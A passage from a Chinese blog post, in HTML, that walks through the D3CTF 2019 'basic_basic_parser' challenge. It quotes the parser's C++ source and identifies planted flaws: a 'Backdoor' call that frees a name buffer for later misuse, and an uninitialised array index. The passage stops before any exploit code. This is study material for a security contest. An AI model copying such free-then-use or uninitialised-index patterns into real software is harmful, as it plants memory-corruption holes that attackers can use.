@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="程序分析题目是手写的递归下降parser.从lexer这里可以看到能够使用的lexeme:12345678910111213141516171819202122232425void initTable()&amp;#123;    symbol.insert(pair&amp;lt;string, int&amp;gt;(&quot;begin&quot;, 1));    symbol.insert(pair&amp;lt;string, int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D3CTF  2012019 basic_basic_parser">
+<meta property="og:url" content="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/index.html">
+<meta property="og:site_name" content="ditto&#39;s blog">
+<meta property="og:description" content="程序分析题目是手写的递归下降parser.从lexer这里可以看到能够使用的lexeme:12345678910111213141516171819202122232425void initTable()&amp;#123;    symbol.insert(pair&amp;lt;string, int&amp;gt;(&quot;begin&quot;, 1));    symbol.insert(pair&amp;lt;string, int">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/3.png">
+<meta property="og:updated_time" content="2020-01-24T02:28:06.015Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="D3CTF  2012019 basic_basic_parser">
+<meta name="twitter:description" content="程序分析题目是手写的递归下降parser.从lexer这里可以看到能够使用的lexeme:12345678910111213141516171819202122232425void initTable()&amp;#123;    symbol.insert(pair&amp;lt;string, int&amp;gt;(&quot;begin&quot;, 1));    symbol.insert(pair&amp;lt;string, int">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/">
+
+
+
+
+
+  <title>D3CTF  2012019 basic_basic_parser | ditto's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ditto's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/23/D3CTF-2012019-basic-basic-parser/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ditto">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/my.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ditto's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">D3CTF  2012019 basic_basic_parser</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-23T21:37:26+08:00">
+                2020-01-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  16
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>题目是手写的递归下降parser.<br>从lexer这里可以看到能够使用的lexeme:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initTable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"begin"</span>, <span class="number">1</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"end"</span>, <span class="number">2</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"integer"</span>, <span class="number">3</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"if"</span>, <span class="number">4</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"then"</span>, <span class="number">5</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"else"</span>, <span class="number">6</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"function"</span>, <span class="number">7</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"read"</span>, <span class="number">8</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"write"</span>, <span class="number">9</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"symbol"</span>, <span class="number">10</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"constant"</span>, <span class="number">11</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"="</span>, <span class="number">12</span>));  <span class="comment">// eq</span></span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"&lt;&gt;"</span>, <span class="number">13</span>)); <span class="comment">// ne</span></span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"&lt;="</span>, <span class="number">14</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"&lt;"</span>, <span class="number">15</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"&gt;="</span>, <span class="number">16</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"&gt;"</span>, <span class="number">17</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"-"</span>, <span class="number">18</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"*"</span>, <span class="number">19</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">":="</span>, <span class="number">20</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">"("</span>, <span class="number">21</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">")"</span>, <span class="number">22</span>));</span><br><span class="line">    symbol.insert(pair&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;(<span class="string">";"</span>, <span class="number">23</span>));</span><br></pre></td></tr></table></figure></p>
+<h4 id="几个类"><a href="#几个类" class="headerlink" title="几个类"></a>几个类</h4><p><strong>Variable类</strong>：parse过程中每遇到一个变量就创建一个新的Variable实例.这里函数也算是一个变量.<br>其数据域：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">string</span> name;    <span class="comment">// 变量的名称</span></span><br><span class="line">  <span class="keyword">char</span>* name_copy;<span class="comment">//存储变量名的另一个地方</span></span><br><span class="line">  <span class="keyword">string</span> <span class="built_in">process</span>; <span class="comment">//该变量所处的process的名字</span></span><br><span class="line">  <span class="keyword">int</span> tpName;     <span class="comment">// 该变量的类型名称，integer 或者function..</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">position</span>;   <span class="comment">// 在该变量所属的process中Vars数组中的index</span></span><br></pre></td></tr></table></figure></p>
+<p>使用name_copy的地方有:<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Variable(string <span class="keyword">name</span>, string process, <span class="built_in">int</span> tpName, <span class="built_in">int</span> <span class="keyword">position</span>) : <span class="keyword">name</span>(<span class="keyword">name</span>), process(process), tpName(tpName), <span class="keyword">position</span>(<span class="keyword">position</span>)</span><br><span class="line">&#123;</span><br><span class="line">    name_copy = (<span class="built_in">char</span>*)malloc(<span class="keyword">name</span>.<span class="built_in">size</span>());</span><br><span class="line">    memcpy(name_copy,<span class="keyword">name</span>.c_str(),<span class="keyword">name</span>.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>构造函数这里先根据变量名的长度动态分配一块空间，将其地址存储在name_copy中，然后将变量名复制过去.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(name_copy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>backdoor函数这里将name_copy给free了.<br>调用Backdoor的地方是Format这里:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> Format(<span class="keyword">int</span> level, <span class="keyword">string</span> padding)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">string</span> res = padding + <span class="string">"Variable:\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"name : "</span> + name + <span class="string">"\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"proc : "</span> + <span class="built_in">process</span> + <span class="string">"\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"kind : 0\n"</span>;</span><br><span class="line">    <span class="built_in">if</span> (tpName == FUNCTION)</span><br><span class="line">    &#123;</span><br><span class="line">        res += padding + <span class="string">"type : function\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">else</span> <span class="built_in">if</span> (tpName == INTEGER)</span><br><span class="line">    &#123;</span><br><span class="line">        res += padding + <span class="string">"type : integer\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res += padding + <span class="string">"vlev : "</span> + to_string(level) + <span class="string">"\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"vadr : "</span> + to_string(<span class="built_in">position</span>) + <span class="string">"\n"</span>;</span><br><span class="line">    <span class="built_in">if</span>(name == <span class="string">"backdoor"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Backdoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将变量格式化成string然后返回.这个函数是后面用来打印变量信息的时候使用的.<br>注意函数最后会判断变量的名称是不是 “backdoor” , 如果是的话，就会调用Backdoor函数将name_copy给free了.这里后面利用的时候会用到.</p>
+<p><strong>Process类</strong>：parse过程中每遇到一个函数就会创建一个新的Process实例,例如parse这里:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lastProcess = nowProcess;</span><br><span class="line"><span class="function"><span class="title">nowProcess</span> = new Process(p-&gt;</span><span class="function"><span class="title">name</span>, lastProcess-&gt;</span>getLevel() + <span class="number">1</span>);<span class="comment">//创建一个新的process</span></span><br><span class="line">allProcess.push_back(nowProcess);<span class="comment">//将该Process压入allProcess_vector中</span></span><br><span class="line"><span class="function"><span class="title">addVar</span>(p-&gt;</span><span class="keyword">name</span>, FUNCTION, <span class="number">1</span>);<span class="comment">//新增一个变量，类型是function</span></span><br></pre></td></tr></table></figure></p>
+<p>其数据域如下:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">char</span>* securt[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">  Variable** vars;   </span><br><span class="line">  <span class="keyword">string</span> processName;<span class="comment">//该Process的名称</span></span><br><span class="line">  <span class="keyword">int</span> level;         <span class="comment">//在第几层Process中</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">position</span>;</span><br></pre></td></tr></table></figure></p>
+<p>securt[0]存放的是一个字符串指针，vars存放是指向当前Process中的变量的指针，构造函数这里进行了初始化:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Process(<span class="built_in">string</span> name, <span class="keyword">int</span> level) : processName(name), level(level) </span><br><span class="line">&#123;</span><br><span class="line">    vars = (Variable**)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    securt[<span class="number">0</span>] = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(securt[<span class="number">0</span>],<span class="string">"d3ctf"</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>向vars中添加变量:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> AddVar(Variable a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="built_in">position</span> &gt;= <span class="number">0xe0</span>/<span class="number">8</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">position</span>++;</span><br><span class="line">    vars[n] = <span class="keyword">new</span> Variable();</span><br><span class="line">    *vars[n] = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>他是将position当做Index来向vars数组中添加Variable指针.<br>但是注意<strong>构造函数这里没有将position初始化为0</strong>,这意味着position可以是垃圾数据.它这里检查了上限，但是还可以进行下溢.利用的时候没有用到这一点.</p>
+<h4 id="parser"><a href="#parser" class="headerlink" title="parser:"></a>parser:</h4><p>开始parse的入口函数是：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> StartAnalysis()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> p = sourceList.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="built_in">while</span> (p-&gt;type == EOLN)</span><br><span class="line">    &#123;</span><br><span class="line">        p++;</span><br><span class="line">        <span class="built_in">line</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    nowProcess = <span class="keyword">new</span> <span class="built_in">Process</span>(<span class="string">"main"</span>, <span class="number">0</span>);</span><br><span class="line">    allProcess.push_back(nowProcess);</span><br><span class="line">    <span class="keyword">auto</span> next = S(p);</span><br><span class="line">    <span class="built_in">if</span> (next-&gt;type != MYEOF)</span><br><span class="line">    &#123;</span><br><span class="line">        WriteError(<span class="string">"can find eof"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将整个程序当做是一个最外层的Process，process的名字的main，然后将这个新创建的Process压入allProcess中，allProcess是一个vector.<br>S函数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">list&lt;SymInfo&gt;<span class="symbol">:</span><span class="symbol">:iterator</span> S(list&lt;SymInfo&gt;<span class="symbol">:</span><span class="symbol">:iterator</span> p)</span><br><span class="line">&#123;</span><br><span class="line">    auto <span class="keyword">next</span> = _get_next(p);</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;type != <span class="keyword">BEGIN</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">next</span> = A(<span class="keyword">next</span>); <span class="regexp">//</span> p 指向<span class="keyword">begin</span>，则<span class="keyword">next</span>指向<span class="keyword">begin</span>的下一个token</span><br><span class="line">    auto nnext = _get_next(<span class="keyword">next</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">next</span>-&gt;type != SEM)</span><br><span class="line">    &#123;</span><br><span class="line">        WriteError(<span class="string">"missing ;"</span>);</span><br><span class="line">        nnext = _get_last(nnext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">next</span> = B(nnext);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">next</span>-&gt;type != <span class="keyword">END</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WriteError(<span class="string">"can't find end"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _get_next(<span class="keyword">next</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>它先检查第一个token是不是”begin”,如果是的话再解析主体，解析完会检查末尾是不是”end”<br>A调用到了C:<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;SymInfo&gt;<span class="type">::iterator</span> C(<span class="built_in">list</span>&lt;SymInfo&gt;<span class="type">::iterator</span> p) <span class="comment">//</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;<span class="keyword">type</span> == <span class="built_in">INTEGER</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> H(_get_next(p));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        auto backup = p;</span><br><span class="line">        p = _get_next(p);<span class="comment">//跳到下一个token</span></span><br><span class="line">        auto next = H(p);</span><br><span class="line">        <span class="keyword">if</span> (next == p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> _get_last(p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next-&gt;<span class="keyword">type</span> == SEM)</span><br><span class="line">        &#123;</span><br><span class="line">            WriteError(<span class="string">"can't find integer, find "</span> + backup-&gt;name);</span><br><span class="line">            <span class="keyword">return</span> next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _get_last(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>C函数是用来处理变量声明，如果以”integer”开头的话就会继续调用H来处理剩下的东西.<br>H函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list</span>&lt;SymInfo&gt;::iterator H(<span class="keyword">list</span>&lt;SymInfo&gt;::iterator p)</span><br><span class="line">&#123;</span><br><span class="line">    auto next = I(p);<span class="comment">//检查p是否是symbol，如果是symbol，则p++,否则直接返回p</span></span><br><span class="line">    <span class="keyword">if</span> (next == p)<span class="comment">// p 不是symbol，处理function</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//integer function id()</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;type != <span class="function"><span class="keyword">FUNCTION</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">            WriteError(<span class="string">"can't find function"</span>);</span><br><span class="line">            p = _get_last(p);</span><br><span class="line">        &#125;</span><br><span class="line">        p = _get_next(p);<span class="comment">//跳过function</span></span><br><span class="line">        next = I(p);<span class="comment">//则next现在指向 函数名称 的下一个token</span></span><br><span class="line">        addVar(p-&gt;name, <span class="function"><span class="keyword">FUNCTION</span>)</span>;</span><br><span class="line"></span><br><span class="line">        auto nnext = _get_next(next);</span><br><span 